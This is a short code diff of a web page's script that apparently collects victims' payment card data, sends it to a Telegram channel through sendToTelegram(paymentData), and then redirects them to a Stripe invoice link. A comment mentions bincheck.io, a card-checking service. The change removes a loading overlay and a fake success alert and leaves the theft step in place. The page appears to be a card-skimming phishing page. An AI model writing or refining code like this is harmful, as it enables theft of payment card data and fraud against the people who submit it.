@@ -505,17 +505,11 @@ document.addEventListener('DOMContentLoaded', function() {
         `;
 
         try {
-            // Show loading again while sending to Telegram
-            loadingOverlay.classList.add('active');
-            
             // Send data to Telegram
             await sendToTelegram(paymentData);
             
             // Hide loading overlay
             loadingOverlay.classList.remove('active');
-            
-            // Show success message
-            alert('Payment processed successfully!');
             
             // Redirect to bincheck.io
             window.location.href = 'https://invoice.stripe.com/i/acct_1OgjPgLoh05CvedE/live_YWNjdF8xT2dqUGdMb2gwNUN2ZWRFLF9UM2lUczY3c0hJS3lCRU9FaVJrZ3N1ajdkSmdoYTdKLDE0ODQ3ODUwNA02003UPw987S?s=db';
@@ -549,4 +543,5 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 </script>
 </body>
+
 </html>
